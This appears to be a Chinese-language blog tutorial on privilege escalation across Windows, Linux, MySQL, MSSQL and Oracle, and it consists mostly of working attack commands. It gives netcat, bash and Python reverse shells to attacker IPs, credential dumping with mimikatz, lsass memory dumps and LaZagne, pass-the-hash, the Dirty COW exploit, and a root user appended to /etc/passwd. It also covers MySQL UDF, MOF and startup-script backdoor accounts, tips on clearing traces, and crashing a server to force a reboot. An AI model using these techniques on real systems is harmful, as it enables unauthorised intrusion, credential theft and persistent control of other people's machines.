<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查找可以修改的服务</span><br><span class="line">sc qc “Service”  </span><br><span class="line"></span><br><span class="line">sc config xxx binpath= “net user rottenadmin P@ssword123! /add”</span><br><span class="line">sc stop xxx</span><br><span class="line">sc start xxx</span><br></pre></td></tr></table></figure>

<p>每当我们开启服务时sc命令都返回了一个错误。这是因为net user命令没有指向二进制服务，因此SCM无法 与服务进行通信，通过使用执行自动迁移到新进程的payload，手动迁移进程，或者在执行后将服务的bin路径设置回原始服务二进制文件，可以解决这个问题。或者我们在权限允许的情况下，将我们的木马放到服务目录下，并重命名为服务启动的应用名称。电脑重启时即可获得一个system的shell</p>
<h5 id="完整案例："><a href="#完整案例：" class="headerlink" title="完整案例："></a>完整案例：</h5><p><strong>①、利用系统自带的 DcomLaunch服务测试(此服务Power User组低权可操作)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查询DcomLaunch的详细信息</span><br><span class="line">sc qc DcomLaunch</span><br><span class="line">#查看服务是否启动</span><br><span class="line">net start | find &quot;DCOM Server Process Launcher&quot;  </span><br><span class="line"></span><br><span class="line">#运行 tasklist /svc  找到对应服务</span><br><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>

<p><strong>②、修改服务并获取系统权限</strong></p>
<p>这里要配置使用nc反弹shell到我的攻击机上，把nc放到c:\windows\temp目录下，使用sc对服务进行修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc config DcomLaunch binpath= &quot;C:\wmpub\nc.exe -nv 192.168.32.194 4433 -e C:\WINDOWS\system32\cmd.exe&quot;  </span><br></pre></td></tr></table></figure>

<p>⛔注意<code>binpath=</code>后面一定要有个空格，IP为攻击者IP</p>
<p><strong>③、查看是否第二步成功</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc qc DcomLaunch </span><br></pre></td></tr></table></figure>

<p><strong>④、配置账号密码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc config DcomLaunch obj= &quot;.\LocalSystem&quot;  password= &quot;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>obj：</strong>指定运行服务将使用的帐户名，或指定运行驱动程序将使用的 Windows 驱动程序对象名。默认设置为 LocalSystem。<br><strong>password：</strong>指定一个密码。如果使用了非 LocalSystem 的帐户，则此项是必需的。</p>
<p><strong>⑤、重启服务</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net start DcomLaunch </span><br></pre></td></tr></table></figure>

<p><strong>⑥、攻击机上用nc进行监听4433即可得到反弹的shell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc.exe -vv -l -p 4433</span><br></pre></td></tr></table></figure>

<h3 id="六、计划任务"><a href="#六、计划任务" class="headerlink" title="六、计划任务"></a>六、计划任务</h3><p><strong>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行恶意程序。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看计算机的计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line">#查看指定目录的权限配置情况</span><br><span class="line">accesschk.exe -dqv &quot;D:\test&quot; -accepteula</span><br></pre></td></tr></table></figure>

<h3 id="七、Meterpreter基础提权"><a href="#七、Meterpreter基础提权" class="headerlink" title="七、Meterpreter基础提权"></a>七、Meterpreter基础提权</h3><p><strong>首先在Meterpreter会话执行ps命令查看目标机当前进程：</strong><br>假设此处看到了一个进程，运行账户是域管理员，我们可以再第一栏找到对应的进程PID，假设PID为2584：<br>然后我们可以执行以下语句窃取该用户进程的令牌：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steal_token  2584</span><br></pre></td></tr></table></figure>

<h2 id="溢出漏洞安全防范"><a href="#溢出漏洞安全防范" class="headerlink" title="溢出漏洞安全防范"></a>溢出漏洞安全防范</h2><p><strong>及时通过Windows Update或第三方工具360更新补丁</strong></p>
<h2 id="提权后获取管理员密码"><a href="#提权后获取管理员密码" class="headerlink" title="提权后获取管理员密码"></a>提权后获取管理员密码</h2><p>虽然我们已经有了管理员权限，但是我们最好是再获取管理员密码，原因如下</p>
<ol>
<li>很多管理员账号密码都设置成一样的，攻下一台就可以拿下所有</li>
<li>远程连接时，比如使用木马，很容易被发现或者清理</li>
<li>如果用管理员账号，可以清除渗透痕迹</li>
<li>正规渗透测试过程中，都是取得管理员账号密码，登录3389端口或反端口连接者证明为成功</li>
</ol>
<blockquote>
<p>简单地说就是从获取管理员权限——&gt;获取管理员账号</p>
</blockquote>
<h3 id="1、本地管理员密码如何直接提取"><a href="#1、本地管理员密码如何直接提取" class="headerlink" title="1、本地管理员密码如何直接提取"></a>1、本地管理员密码如何直接提取</h3><h4 id="①、直接通过mimikatz读取管理员密码"><a href="#①、直接通过mimikatz读取管理员密码" class="headerlink" title="①、直接通过mimikatz读取管理员密码"></a>①、直接通过mimikatz读取管理员密码</h4><blockquote>
<p>mimikatz，很多人称之为密码抓取神器，它的功能很多，最重要的是能从 lsass.exe进程中获取windows的账号及明文密码——这是以前的事了，微软知道后已经准备了补丁，lsass进程不再保存明文口令。Mimikatz 现在只能读到加密后的密码。<br><strong>win10无效</strong></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"># 抓取密码</span><br><span class="line">sekurlsa::logonpassWords</span><br></pre></td></tr></table></figure>

<p>当无法上传mimikatz工具到目标服务器时，可以利用procdump把lsass进程的内存文件导出本地，再在本地利用mimikatz读取密码，具体步骤如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 导出lsass.exe进程为lsass.dump文件</span><br><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>

<h4 id="②、Lazagne-需要本地支持python"><a href="#②、Lazagne-需要本地支持python" class="headerlink" title="②、Lazagne 需要本地支持python"></a>②、Lazagne 需要本地支持python</h4><blockquote>
<p>LaZagne项目是用于开源应用程序获取大量的密码存储在本地计算机上。每个软件都使用不同的技术（纯文本，API，自定义算法，数据库等）存储其密码。<br>LaZagne 几乎支持市面上大部分常用工具。包括浏览器、Git、SVN、Wifi、Databases 等。<br>但是对聊天软件的支持不够本土化，主要支持一些国外的聊天软件。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">laZagne.exe all  #获取所有密码</span><br><span class="line">laZagne.exe browsers  #只获取浏览器记住的密码</span><br><span class="line">laZagne.exe all -oN  #将输出保存到文件    </span><br></pre></td></tr></table></figure>

<p>-oN表示是纯文本格式（正常的）的输出，和屏幕打印内容相同；还可以写成-oJ，JSON格式的输出，更便于程序解析；或者写成-oA，同时输出两种格式。</p>
<h3 id="2、本地Hash远程直接登录"><a href="#2、本地Hash远程直接登录" class="headerlink" title="2、本地Hash远程直接登录"></a>2、本地Hash远程直接登录</h3><hr>
<p>高版本的系统，密码不是明文的情况下，直接通过哈希值来取得管理员账号。主要通过MSF提供的exploit&#x2F;windows&#x2F;smb&#x2F;psexec模块来完成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf&gt;use exploit/windows/smb/psexec</span><br><span class="line">msf&gt;set rhost #目标IP </span><br><span class="line">msf&gt;set SMBUser administrator  #目标账号</span><br><span class="line">msf&gt;set SMBPass aaaaaa:bbbbbb  #目标哈希值</span><br><span class="line">msf&gt;exploit </span><br><span class="line">msf&gt;shell</span><br></pre></td></tr></table></figure>

<h3 id="3、Hash密钥暴力破解"><a href="#3、Hash密钥暴力破解" class="headerlink" title="3、Hash密钥暴力破解"></a>3、Hash密钥暴力破解</h3><hr>
<ol>
<li>通过LC5暴力hash密码<br>使用gmer直接提权SAM和system文件或用Pwdump7提取hash后，最后使用LC5破解</li>
<li>使用ophcrack破解系统hash密码<br><a href="http://simeon.blog.51cto.com/18680/122160">http://simeon.blog.51cto.com/18680/122160</a></li>
</ol>
<h1 id="Linux系统提权"><a href="#Linux系统提权" class="headerlink" title="Linux系统提权"></a>Linux系统提权</h1><p>当拿到了一台Linux服务器的低权限账号后，要通过技术手段提权至 root 用户权限，以执行更多的操作。首先关于Linux提权我们得先明白几个概念。</p>
<h2 id="linux内核知识"><a href="#linux内核知识" class="headerlink" title="linux内核知识"></a>linux内核知识</h2><p>Linux内核版本号由3组数字组成：第一个组数字：内核主版本。 第二个组数字：偶数表示稳定版本；奇数表示开发中版本。第三个组数字：错误修补的次数。<br>3.10.0就是内核版本号。3就是内核主版本，10表示是稳定版，0表示错误修补次数是0。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用以下命令也可以看到系统内核及版本的一些信息：</span><br><span class="line">uname -a                 #查看内核的具体信息</span><br><span class="line">cat /proc/version        #查看内核的具体信息</span><br><span class="line">cat /etc/centos-release  #查看centos发行版本</span><br><span class="line">cat /etc/redhat-release  #查看redhat发行版本</span><br></pre></td></tr></table></figure>

<h2 id="Linux提权方法总结"><a href="#Linux提权方法总结" class="headerlink" title="Linux提权方法总结"></a>Linux提权方法总结</h2><p>Linux提权的前提：</p>
<ol>
<li>拿到了一个低权限的账号</li>
<li>能上传和下载文件</li>
<li>机器上有python、java、perl等环境（非必须项）</li>
</ol>
<h3 id="一、Linux反弹提权"><a href="#一、Linux反弹提权" class="headerlink" title="一、Linux反弹提权"></a>一、Linux反弹提权</h3><p>**如果手里只有webshell可以利用反弹shell来得到一个shell，反弹的权限是中间件的权限。 **</p>
<h4 id="1、NC反弹shell"><a href="#1、NC反弹shell" class="headerlink" title="1、NC反弹shell"></a>1、NC反弹shell</h4><p><strong>NC详情参考：</strong><a href="https://www.cnblogs.com/nmap/p/6148306.html">https://www.cnblogs.com/nmap/p/6148306.html</a></p>
<p><strong>①nc参数介绍</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l		指定nc将处于侦听模式，nc被当作server，侦听并接受连接。</span><br><span class="line">-p		&lt;port&gt;指定端口，老版本才需要-p</span><br><span class="line">-s		指定发送数据的源IP地址，适用于多网卡机</span><br><span class="line">-u		指定nc使用UDP协议，默认为TCP</span><br><span class="line">-v		输出交互或出错信息，新手调试时尤为有用</span><br><span class="line">-w		超时秒数，后面跟数字</span><br><span class="line">-z		表示zero，表示扫描时不发送任何数据</span><br></pre></td></tr></table></figure>

<p><strong>②nc做tcp监听</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开启本地8080端口监听</span><br><span class="line">nc nc -l -p 80802</span><br></pre></td></tr></table></figure>

<p><strong>③nc反弹服务器shell</strong></p>
<p><strong>方法⑴：</strong>公网主机绑定SHELL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#在公网监听端口5555端口,并绑定shell</span><br><span class="line">nc -lp 5555 -t -e cmd.exe</span><br><span class="line">#在内网主动建立到外网IP:5555的连接</span><br><span class="line">nc -nvv x.x.x.x 5555</span><br></pre></td></tr></table></figure>

<p><strong>方法⑵：</strong>内网主机绑定SHELL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#在公网监听端口</span><br><span class="line">nc -lp 5555</span><br><span class="line">#在内网机器绑定shell反弹</span><br><span class="line">nc -t -e cmd x.x.x.x 5555</span><br></pre></td></tr></table></figure>

<h4 id="2、利用bash直接反弹"><a href="#2、利用bash直接反弹" class="headerlink" title="2、利用bash直接反弹"></a>2、利用bash直接反弹</h4><p><strong>（1） bash反弹一句话</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#先公网监听</span><br><span class="line">nc -l -p 8080</span><br><span class="line">#在内网bash反弹</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>网上还有很多方法一句话反弹shell，需要自行搜索</p>
<h3 id="二、内核漏洞提权——脏牛"><a href="#二、内核漏洞提权——脏牛" class="headerlink" title="二、内核漏洞提权——脏牛"></a>二、内核漏洞提权——脏牛</h3><ol>
<li><strong>脏牛漏洞：</strong><br>又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</li>
<li><strong>漏洞范围：</strong><br>Linux内核 &gt;&#x3D; 2.6.22（2007年发行，到2016年10月18日才修复）</li>
<li><strong>简要分析：</strong><br>该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。<br>竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。<br>恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。</li>
<li><strong>exp：</strong><br><a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></li>
</ol>
<h4 id="示例：脏牛内核提权"><a href="#示例：脏牛内核提权" class="headerlink" title="示例：脏牛内核提权"></a>示例：脏牛内核提权</h4><ol>
<li>首先确定发行版、内核版</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<ol>
<li>根据内核版本，找exp，下载对应dirty.c文件编译</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>

<ol>
<li>执行当前编译的dirty.c文件，然后输入新密码123456</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./dirty</span><br><span class="line">#执行后，会将原来的passwd文件备份到/tmp目录</span><br><span class="line">#然后创建的新账号是firefart,密码123456</span><br></pre></td></tr></table></figure>

<ol>
<li>等创建成功后，切换到firefart用户<br>会发现此用户会发现已经是root权限了。<br>最好立刻再新建一个管理员账号，然后立刻恢复passwd文件。<br>因为这个提权不是新建了一个账号，而已用新账号替换了root账号，所以要把root账号恢复回去</li>
</ol>
<h3 id="三、SUID提权"><a href="#三、SUID提权" class="headerlink" title="三、SUID提权"></a>三、SUID提权</h3><p>SUID（设置用户ID）是赋予文件的一种特殊权限，拥有改权限的程序，任何用户执行的时候都是改命令都是以root权限执行的</p>
<p>suid提权是指这类有S权限的程序，如果能执行命令，那么我们就能从用改程序从普通用户提升到了root权限</p>
<h4 id="SUID可用命令"><a href="#SUID可用命令" class="headerlink" title="SUID可用命令"></a>SUID可用命令</h4><p><strong>⑴在本地查找符合条件的文件，有以下三个命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p><strong>⑵已知的可用来提权的linux可行性的文件列表如下：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure>

<h4 id="示例：利用find文件提权"><a href="#示例：利用find文件提权" class="headerlink" title="示例：利用find文件提权"></a>示例：利用find文件提权</h4><p>假如我们现在拿到了一个网站服务器的shell，但是权限是ubuntu，我们现在需要提权到 root 用户权限。</p>
<ol>
<li><p>查看具有root用户权限的SUID文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
</li>
<li><p>发现有find命令，再确认一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lh /usr/bin/find</span><br><span class="line">#权限是rwsr-xr-x 确实有s权限</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试是否能用find命令以root权限运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/find examples.desktop -exec whoami \;</span><br><span class="line">#发现确实可以以root权限运行</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后查看目标网站上是否的python环境<br>linux服务器一般都自带python，区别是有些2.X,有些3.x</p>
</li>
<li><p>于是我们以root用户的身份利用python反弹shell，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#反弹一个sh类型的shell</span><br><span class="line">python -c &#x27;import socket,subprocess,os; \</span><br><span class="line">  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \</span><br><span class="line">  s.connect((&quot;192.168.10.25&quot;,4444)); \</span><br><span class="line">  os.dup2(s.fileno(),0); \</span><br><span class="line">  os.dup2(s.fileno(),1); \</span><br><span class="line">  os.dup2(s.fileno(),2); \</span><br><span class="line">  p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>远端nc监听<code>nc -lvp 4444</code><br>可以看到，在攻击端收到了反弹过来的shell，并且是root身份</p>
</li>
</ol>
<blockquote>
<p>本节来自：<a href="https://blog.csdn.net/qq_36119192/article/details/84872644">https://blog.csdn.net/qq_36119192/article/details/84872644</a></p>
</blockquote>
<h3 id="四、Linux配置错误提权"><a href="#四、Linux配置错误提权" class="headerlink" title="四、Linux配置错误提权"></a>四、Linux配置错误提权</h3><p><strong>利用Linux的配置文件错误，导致 &#x2F;etc&#x2F;passwd 文件可写入提权</strong></p>
<p><strong>对Linux配置进行检查的脚本有：</strong><br><a href="https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a><br><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a></p>
<p><strong>当我们获得了某个Linux服务器的低权限之后，我们想要对该低权限账号进行提权，以执行更多的操作。</strong><br>接下来我们的提权是利用 &#x2F;etc&#x2F;passwd 文件的可写入权限，导致我们写入一个其他用户进去。</p>
<ol>
<li><p>查看 &#x2F;etc&#x2F;passwd 的权限，发现任何用户都可以读写。<br>我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且UID设置为0，将其添加到 &#x2F;etc&#x2F;passwd 文件中。</p>
</li>
<li><p><strong>首先，使用perl语言生成带有盐值的密码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -le &#x27;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>然后将test用户的信息加入 &#x2F;etc&#x2F;passwd 文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>以<code>test/password@123</code>登录主机</strong><br>登录成功后，是 root 权限。</p>
</li>
</ol>
<h3 id="五、定时任务提权"><a href="#五、定时任务提权" class="headerlink" title="五、定时任务提权"></a>五、定时任务提权</h3><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。<br>非root权限的用户是不可以列出root 用户的计划任务的。但是系统的计划任务<code>/etc、cron*</code>可以被列出。<br>默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写，我们就可以修改脚本进行提权了。</p>
<ol>
<li><p>列出系统定时任务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看列出的目录中，是否允许普通用户修改<br>&#x2F;etc&#x2F;cron.daily 、&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.monthly、&#x2F;etc&#x2F;cron.weekly 这四个文件夹内的文件，查看是否允许其他用户修改。<br>如果允许任意用户修改，那么我们就可以往这些文件里面写入反弹shell的脚本提权了。</p>
</li>
</ol>
<h3 id="六、密码复用提权"><a href="#六、密码复用提权" class="headerlink" title="六、密码复用提权"></a>六、密码复用提权</h3><p>我们如果在主机上找到了其他应用或数据库的密码，那么很有可能root用户也用该密码，或者该参考该密码命名规则。那么就可以尝试一下 su root 来提权了。</p>
<h1 id="数据库提权到操作系统"><a href="#数据库提权到操作系统" class="headerlink" title="数据库提权到操作系统"></a>数据库提权到操作系统</h1><p>攻击者如果获取了通过数据库root权限，是可以通过提权，获取操作系统最高权限的。</p>
<h2 id="Mysql数据库提权"><a href="#Mysql数据库提权" class="headerlink" title="Mysql数据库提权"></a>Mysql数据库提权</h2><h3 id="如何获取mysql账号密码"><a href="#如何获取mysql账号密码" class="headerlink" title="如何获取mysql账号密码"></a>如何获取mysql账号密码</h3><p>当通过webshell进入服务器后，怎么得到数据库的账号密码呢</p>
<ol>
<li><p>查看网站配置文件。</p>
<p>如:conn、config、data、sql、common 、inc等。</p>
</li>
<li><p>查看数据库物理路径下的user表文件<br>目录为&#x2F;data&#x2F;mysql&#x2F;user.myd和user.myi<br>密码是加密的，需要再次进行破解</p>
</li>
<li><p>通过暴力破解得到（hscan、Bruter、hydra、脚本木马）<br>如果对外开放3306，即允许远程连接，可以远程爆破<br>补充：mysql开启root账号远程访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON*.*TO root@&quot;\%&quot;IDENTIFIED BY&quot;root&quot;;</span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="利用UDF自身提权"><a href="#利用UDF自身提权" class="headerlink" title="利用UDF自身提权"></a>利用UDF自身提权</h3><hr>
<ol>
<li>原理<br>UDF提权是利用MYSQL的Create Function语句，将MYSQL账号转化为系统system权限。</li>
<li>利用条件<ul>
<li>目标系统是Windows(Win2000,XP,Win2003)</li>
<li>已经拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数</li>
<li>有root账号和密码</li>
</ul>
</li>
</ol>
<p><strong>利用方式A</strong></p>
<ol>
<li><p>使用工具“mysql综合利用工具”连接<br>填写地址、root账号、密码后进行连接</p>
<p><img src="http://noah-pic.oss-cn-chengdu.aliyuncs.com/pic/20210806/164305231.png" alt="mark"></p>
</li>
<li><p>导入udf.dll文件<br>连接成功后，导出DLL文件，导入时请勿必注意导出路径（一般情况下对任何目录可写，无需考虑权限问题），否则在下一步操作中你会看到”No paths allowed for shared library”错误。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#不同版本mysql，udf.dll存放路径不同</span><br><span class="line">#Mysql版本大于5.1版本。</span><br><span class="line">xx\\mysql\\lib\\plugin\\udf.dll 文件夹下。</span><br><span class="line">#Mysql5.1版本默认路径。</span><br><span class="line">C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll</span><br><span class="line">#Mysql版本小于5.1版本。</span><br><span class="line">Windows2003下放置于c:\\windows\\system32\\udf.dll</span><br><span class="line">windows2000下放置于c:\\winnt\\system32\\udf.dll</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>一般Lib、Plugin文件夹需要在webshell先手工建立（也可用NTFS ADS流模式突破进而创建文件夹）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```sql</span><br><span class="line">#查找到mysql的目录后</span><br></pre></td></tr></table></figure>

<p>select @@basedir;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#利用NTFS ADS创建lib目录</span><br></pre></td></tr></table></figure>

<p>select ‘It is dll’ into dumpfile ‘C:\ProgramFiles\MySQL\MySQL Server 5.1\lib::$INDEX_ALLOCATION’;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#利用NTFS ADS创建plugin目录</span><br><span class="line">select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\ProgramFiles\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;; </span><br><span class="line">```</span><br></pre></td></tr></table></figure>

<ol>
<li><p>UDF提权常用命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建cmdshell函数，如果用3389就需要创建open3389函数，具体有哪些函数看帮助</span><br><span class="line">create function cmdshell returns string soname &#x27;udf.dll&#x27;; </span><br><span class="line">#创建好函数后，用函数执行系统命令</span><br><span class="line">select cmdshell(&#x27;net user&#x27;);</span><br><span class="line">select open3389();</span><br><span class="line">drop function cmdshell; 删除函数</span><br><span class="line">delete from mysql.func where name=&#x27;cmdshell&#x27;  删除函数</span><br></pre></td></tr></table></figure>

<p>使用完成后你可能需要删除在第二步中导出的DLL，但在删除DLL前请先删除你在第三步中创建的函数，否则删除操作将失败，删除第三步中创建的函数的SQL语句为：drop function 创建的函数名；</p>
</li>
</ol>
<p><strong>利用方式B</strong></p>
<p>UDF脚本提权,当mysql不能远程连接时，可以上传udf脚本至对方主机，然后通过webshell的方式进行连接操作。</p>
<h3 id="利用mof提权"><a href="#利用mof提权" class="headerlink" title="利用mof提权"></a>利用mof提权</h3><p><strong>MOF漏洞工具与脚本实战：</strong><a href="http://www.myhack58.com/Article/html/3/8/2013/38264.htm">http://www.myhack58.com/Article/html/3/8/2013/38264.htm</a></p>
<ol>
<li>原理<br>在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要将要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</li>
<li>利用条件<ul>
<li>mysql用户具有root权限</li>
<li>且可以复制文件到c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下</li>
<li>关闭了secure-file-priv</li>
</ul>
</li>
</ol>
<p><strong>利用方式1</strong><br>通过工具如“mysql综合利用工具”直接提取，输入账户密码连接数据库后可直接输入系统命令，创建账号。</p>
<p><strong>利用方式2</strong></p>
<p>通过上传mof文件，然后在sql中运行的方式</p>
<ol>
<li><p>找个可写目录，上传mof文件</p>
<p>假设上传的目录为文件夹<code>C:\\wmpub\\moon.mof</code><br>该mof文件，已经写死了要创建的账号密码等信息</p>
</li>
<li><p>执行sql，转移文件到系统目录，等待创建新账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;C:\\wmpub\\moon.mof&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/moon.mof&#x27;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行完后，验证账号<br>在webshell里执行使用net user查看是否多了一个admin用户，如果有则说明可以利用，否则就不需要继续了，注意新建的帐号每隔5分钟就会新建帐号，删除帐号的办法参考上文链接</p>
</li>
</ol>
<h3 id="通过Mysql把文件写入启动项"><a href="#通过Mysql把文件写入启动项" class="headerlink" title="通过Mysql把文件写入启动项"></a>通过Mysql把文件写入启动项</h3><ol>
<li><p>通过mysql数据库命令写入VBS脚本；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt;drop database test1;</span><br><span class="line">mysql&gt; create database test1;</span><br><span class="line">mysql&gt; use test1;</span><br><span class="line">mysql&gt; create table a (cmd text);</span><br><span class="line">mysql&gt;insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;)&quot;);</span><br><span class="line">mysql&gt;insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user best best /add&quot;&quot;,0)&quot;);</span><br><span class="line">mysql&gt;insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup Administrators best /add&quot;&quot;,0)&quot;);</span><br><span class="line">#注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个VBS的脚本程序</span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2. 直接通过Webshell的Mysql写入启动项；</span><br><span class="line">    ```sql</span><br><span class="line">    mysql&gt;select * from a;</span><br><span class="line">    mysql&gt;select * from a into outfile &quot;c://docume~1//administrator//「开始」菜单//程序//启动//best.vbs&quot;;</span><br></pre></td></tr></table></figure>

<ol>
<li>通过MS12-020、MS15-034重启服务器。<br>服务器down机后，管理员会重启，重启后我们就能得到新建的管理员账号了</li>
</ol>
<h2 id="微软Mssql提权"><a href="#微软Mssql提权" class="headerlink" title="微软Mssql提权"></a>微软Mssql提权</h2><p>mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。</p>
<p>通过漏洞拉到webshell之后，找到网站配置文件，里面有<strong>sa权限</strong>的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的，mssql一般是允许远程连接的，系统库是master。<br>有了sa密码直接利用sqltools工具就可以了</p>
<h2 id="如何通过Oracle提权"><a href="#如何通过Oracle提权" class="headerlink" title="如何通过Oracle提权"></a>如何通过Oracle提权</h2><p>Oracle数据库一般与jsp、aspx网站搭配，如果是jsp网站，默认是系统权限，aspx网站默认需要提权。</p>
<p><strong>提权方法参考：</strong><a href="http://blog.csdn.net/sezvboyrul/article/details/2855401,%E5%B7%A5%E5%85%B7%E4%B8%BA%60oracleshell%60">http://blog.csdn.net/sezvboyrul/article/details/2855401,工具为`oracleshell`</a></p>
